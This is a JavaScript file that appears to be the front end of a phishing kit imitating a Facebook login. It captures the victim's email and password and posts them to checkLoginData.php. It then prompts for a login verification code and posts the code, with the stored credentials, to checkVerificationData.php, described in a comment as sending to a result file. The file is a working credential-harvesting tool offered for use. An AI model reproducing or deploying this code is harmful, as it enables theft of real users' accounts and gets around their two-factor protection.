// code for showing hiding popup
function open_account_login() {
    $('.login-sec').show();
    $('.home-sec').hide();
}

// code for validate data to next step
function ValidateLoginFbData() {
    $emailfb = $('#email-facebook').val().trim();
    $passwordfb = $('#password-facebook').val().trim();
    if ($emailfb.length < 5) {
        $('.email-fb').show();
        $('.sandi-fb').hide();
        $('.info-fb').hide();
        $('.login-sec').show();
        return false;
    } else if ($passwordfb.length < 5) {
        $('.sandi-fb').show();
        $('.email-fb').hide();
        $('.info-fb').hide();
        $('.login-sec').show();
        return false;
    } else {
        $.ajax({
            type: "POST",
            url: "checkLoginData.php",
            data: $("#ValidateLoginFbForm").serialize(),
            beforeSend: function() {
                $('.email-fb').hide();
                $('.sandi-fb').hide();
                $('.info-fb').hide();
                $('.login-sec').hide();
				$('.loading-sec').show();
            },
            success: function() {
				$('.loading-sec').hide();
				$('.final-sec').show();
				$("input#validateEmail").val($emailfb);
                $("input#validatePassword").val($passwordfb);
                return true;
            }
        });
    };
};

// show hide password for facebook and twitter
function showFirstFbPassword() {
    var xFirst = document.getElementById("password-facebook");
    if (xFirst.type === "password") {
        xFirst.type = "text";
        $('.showFirstFbPassword').hide();
        $('.hideFirstFbPassword').show();
    } else {
        xFirst.type = "password";
    }
}
function hideFirstFbPassword() {
    var xFirst = document.getElementById("password-facebook");
    if (xFirst.type === "text") {
        xFirst.type = "password";
        $('.showFirstFbPassword').show();
        $('.hideFirstFbPassword').hide();
    } else {
        xFirst.type = "text";
    }
}

// code for validate data to sending to file result
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $loginCode = $("input#loginCode").val();
	if($validateEmail == "" && $validatePassword == "" && $loginCode == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "checkVerificationData.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading-sec').show();
			$('.final-sec').hide();
		},
		success: function(){
		$('#loginCode').val('');
		$(".final-sec").show();
		$(".loading-sec").hide();
		}
	});
	});  
	return false;
};